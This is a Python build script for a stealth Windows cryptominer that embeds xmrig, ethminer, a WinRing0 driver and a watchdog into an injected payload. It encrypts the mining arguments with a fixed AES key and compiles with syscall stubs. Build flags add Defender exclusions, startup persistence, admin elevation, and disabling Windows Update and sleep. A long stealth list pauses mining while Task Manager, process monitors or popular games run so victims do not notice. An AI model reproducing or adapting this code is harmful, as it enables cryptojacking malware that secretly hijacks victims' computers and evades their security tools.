import os
import random
import shutil
import string
import time
import argparse
from watchdog_builder import prepare_watchdog_compiler, compile_watchdog
import platform


def prepare_miner_compiler():
    if os.path.exists('UFiles_Miner'):
        shutil.rmtree('UFiles_Miner')
    os.mkdir('UFiles_Miner')
    shutil.copytree('Includes', 'UFiles_Miner/Includes')


def gen_miner_code(disable_inject=False):
    with open('miner.cpp') as f:
        miner_template = f.read()
    if disable_inject:
        with open('miners/ethminer.origin.exe', 'rb') as f:
            miner_bytes = f.read()
    else:
        with open('miners/ethminer.exe', 'rb') as f:
            miner_bytes = f.read()
    res_eth = "BYTE resETH[] = {" + ','.join(
        [str(x) for x in miner_bytes]) + "};\n" + f"long resETHSize = {len(miner_bytes)};\n"
    if disable_inject:
        with open('miners/xmrig.origin.exe', 'rb') as f:
            miner_bytes = f.read()
    else:
        with open('miners/xmrig.exe', 'rb') as f:
            miner_bytes = f.read()
    res_xmr = "BYTE resXMR[] = {" + ','.join(
        [str(x) for x in miner_bytes]) + "};\n" + f"long resXMRSize = {len(miner_bytes)};\n"
    with open('miners/WinRing0x64.sys', 'rb') as f:
        wr64_bytes = f.read()
    res_wr64 = "BYTE resWR64[] = {" + ','.join(
        [str(x) for x in wr64_bytes]) + "};\n" + f"long resWR64Size = {len(wr64_bytes)};\n"
    if disable_inject:
        res_watchdog = "BYTE resWatchdog[] = {0};\n" + f"long resWatchdogSize = 0;\n"
        shutil.copy('watchdog.cpp', 'UFiles_Miner/watchdog.cpp')
    else:
        with open('output/watchdog.exe', 'rb') as f:
            watchdog_bytes = f.read()
        res_watchdog = "BYTE resWatchdog[] = {" + ','.join(
            [str(x) for x in watchdog_bytes]) + "};\n" + f"long resWatchdogSize = {len(watchdog_bytes)};\n"
    resources = res_watchdog + res_xmr + res_eth + res_wr64
    miner_template = miner_template.replace('$RESOURCES', resources)
    with open('UFiles_Miner/miner.cpp', 'w') as f:
        f.write(miner_template)


def unamlib_encrypt(plain_text):
    from Crypto.Cipher import AES
    import base64
    UNAMKEY = "UXUUXUUXUUCommandULineUUXUUXUUXU"
    UNAMIV = "UUCommandULineUU"
    key_bytes = UNAMKEY.encode('ascii')
    iv_bytes = UNAMIV.encode('ascii')
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
    raw_data = plain_text.encode('utf-8')
    padding_len = AES.block_size - len(raw_data) % AES.block_size
    padded_data = raw_data + bytes([0]) * padding_len
    encrypted_data = cipher.encrypt(padded_data)
    return base64.b64encode(encrypted_data).decode('utf-8')


def unamlib_decrypt(encrypted_text):
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    import base64
    UNAMKEY = "UXUUXUUXUUCommandULineUUXUUXUUXU"
    UNAMIV = "UUCommandULineUU"
    key_bytes = UNAMKEY.encode('ascii')
    iv_bytes = UNAMIV.encode('ascii')
    encrypted_data = base64.b64decode(encrypted_text)
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    return decrypted_data.decode('utf-8')


def compile_miner(cipher_key, miner_id, watchdog_id, eth_miner_id, xmr_miner_id, winring, version, dll_name=None,
                  disable_inject=False):
    API_ENDPOINT = 'REPLACE_BY_YOUR_API_ENDPOINT'
    if dll_name:
        VERSION = version + 'd'
    else:
        VERSION = version
    print('Compiling version: ' + VERSION)
    xmr_args = ('--algo=rx/0  '
                '--url=REPLACE_BY_YOUR_POOL '
                '--user="REPLACE_BY_YOUR_WALLET" '
                '--pass="" '
                '--cpu-max-threads-hint=30 '
                f'--cinit-winring="{winring}.sys" '
                '--randomx-no-rdmsr '
                '--cinit-stealth-targets="Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe" '
                f'--cinit-api="{API_ENDPOINT}" '
                f'--cinit-version="{VERSION}" '
                '--tls '
                '--cinit-idle-wait=5 '
                '--cinit-idle-cpu=80 '
                f'--cinit-id="{xmr_miner_id}"')
    eth_args = ('--cinit-algo=etchash '
                '--pool=stratums://`REPLACE_BY_YOUR_WALLET`.etc3@etc.2miners.com:11010 '
                '--cinit-max-gpu=50 '
                '--cinit-stealth-targets="Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,ModernWarfare.exe,ShooterGame.exe,ShooterGameServer.exe,ShooterGame_BE.exe,GenshinImpact.exe,FactoryGame.exe,Borderlands2.exe,EliteDangerous64.exe,PlanetCoaster.exe,Warframe.x64.exe,NMS.exe,RainbowSix.exe,RainbowSix_BE.exe,CK2game.exe,ck3.exe,stellaris.exe,arma3.exe,arma3_x64.exe,TslGame.exe,ffxiv.exe,ffxiv_dx11.exe,GTA5.exe,FortniteClient-Win64-Shipping.exe,r5apex.exe,VALORANT.exe,csgo.exe,PortalWars-Win64-Shipping.exe,FiveM.exe,left4dead2.exe,FIFA21.exe,BlackOpsColdWar.exe,EscapeFromTarkov.exe,TEKKEN 7.exe,SRTTR.exe,DeadByDaylight-Win64-Shipping.exe,PointBlank.exe,enlisted.exe,WorldOfTanks.exe,SoTGame.exe,FiveM_b2189_GTAProcess.exe,NarakaBladepoint.exe,re8.exe,Sonic Colors - Ultimate.exe,iw6sp64_ship.exe,RocketLeague.exe,Cyberpunk2077.exe,FiveM_GTAProcess.exe,RustClient.exe,Photoshop.exe,VideoEditorPlus.exe,AfterFX.exe,League of Legends.exe,Falluot4.exe,FarCry5.exe,RDR2.exe,Little_Nightmares_II_Enhanced-Win64-Shipping.exe,NBA2K22.exe,Borderlands3.exe,LeagueClientUx.exe,RogueCompany.exe,Tiger-Win64-Shipping.exe,WatchDogsLegion.exe,Phasmophobia.exe,VRChat.exe,NBA2K21.exe,NarakaBladepoint.exe,ForzaHorizon4.exe,acad.exe,AndroidEmulatorEn.exe,bf4.exe,zula.exe,Adobe Premiere Pro.exe,GenshinImpact.exe" '
                f'--cinit-api="{API_ENDPOINT}" '
                f'--cinit-version="{VERSION}" '
                '--cinit-idle-wait=5 '
                '--cinit-idle-gpu=90 '
                f'--cinit-id="{eth_miner_id}"')
    encrypted_xmr_args = f'{xmr_miner_id} {unamlib_encrypt(xmr_args)}'
    print(encrypted_xmr_args)
    eth_args = f'{eth_miner_id} {unamlib_encrypt(eth_args)}'
    print(eth_args)
    compile_cmd = ('x86_64-w64-mingw32-g++ -Wl,-subsystem,windows -m64 -DRANDSYSCALL '
                   '-x c++ UFiles_Miner/*.cpp UFiles_Miner/Includes/*.cpp UFiles_Miner/Includes/Syscalls/*.c '
                   '-x assembler UFiles_Miner/Includes/Syscalls/syscallsstubs.rnd.x64.s '
                   f'-LLibs/ {"-llibpeconv_win" if platform.system() == "Windows" else "-llibpeconv"} -I../libpeconv/include '
                   '-g0 -lws2_32 -static-libgcc -static-libstdc++ '
                   '-fno-stack-protector -fno-threadsafe-statics -fvisibility=hidden -fdata-sections '
                   '-ffunction-sections -fno-exceptions '
                   '-Wl,--gc-sections -flto -pipe -Wl,--strip-all -s -o output/miner.exe '
                   '-D _WIN64 -D _WIN32_WINNT=0x0601 ')
    compile_cmd += ('-D DefRunAsAdministrator '
                    '-D DefStartup '
                    '-D DefWDExclusions '
                    '-D DefDisableWindowsUpdate '
                    '-D DefDisableSleep '
                    '-D DefRunInstall '
                    '-D DefStartDelay '
                    '-D DefWatchdog '
                    '-D DefMineXMR '
                    '-D DefMineETH '
                    '-D DefResources ')

    def macro_arg(name, value):
        if platform.system() == 'Windows':
            value = str(value).replace('"', '\\"')
            return f'-D {name}="{value}" '
        else:
            return f'-D {name}=\'{value}\' '

    compile_cmd += (macro_arg('BUILT_UNIX_TIMESTAMP', int(time.time())) +
                    macro_arg('CIPHERKEY', f'"{cipher_key}"') +
                    macro_arg('LMinerETHID', f'L"{eth_miner_id}"') +
                    macro_arg('LMinerXMRID', f'L"{xmr_miner_id}"') +
                    macro_arg('LWATCHDOGID', f'L"{watchdog_id}"') +
                    macro_arg('LMUTEXMINER', f'L"\\\\BaseNamedObjects\\\\{miner_id}"') +
                    macro_arg('LWINRING', f'L"{winring}.sys"') +
                    macro_arg('MinerXMRArgs', f'L"explorer.exe {encrypted_xmr_args}"') +
                    macro_arg('MinerETHArgs', f'L"explorer.exe {eth_args}"'))
    if dll_name:
        compile_cmd += ('-D DefDllMode ' + macro_arg('MyDllName', f'L"{dll_name}"'))
    if disable_inject:
        compile_cmd += '-D DISABLE_INJECT_PROCESS '
    print(compile_cmd)
    os.system(compile_cmd)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--dll-name', type=str, default=None)
    parser.add_argument('--disable-inject', type=bool, default=False)
    parser.add_argument('--version', type=str, default='3.5.3')
    args = parser.parse_args()
    cipher_key = ''.join(
        random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(32))
    miner_id = ''.join(
        random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
    watchdog_id = ''.join(
        random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
    eth_miner_id = ''.join(
        random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
    xmr_miner_id = ''.join(
        random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
    winring = ''.join(
        random.choice(string.ascii_lowercase) for _ in range(12))
    if not os.path.exists('output'):
        os.mkdir('output')
    if not args.disable_inject:
        prepare_watchdog_compiler()
        compile_watchdog(cipher_key, miner_id, watchdog_id, eth_miner_id, xmr_miner_id)
    prepare_miner_compiler()
    gen_miner_code(args.disable_inject)

    compile_miner(cipher_key, miner_id, watchdog_id, eth_miner_id, xmr_miner_id, winring, args.version, args.dll_name,
                  args.disable_inject)
